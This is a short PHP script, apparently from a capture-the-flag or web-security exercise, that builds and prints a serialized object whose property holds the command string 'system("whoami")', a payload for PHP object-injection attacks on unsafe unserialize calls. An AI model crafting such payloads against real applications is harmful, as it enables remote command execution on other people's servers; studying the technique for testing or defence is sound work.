<?php
class Hyyy{
    public $payload = 'system("whoami");';
}
$a = new Hyyy;
echo serialize($a);
?>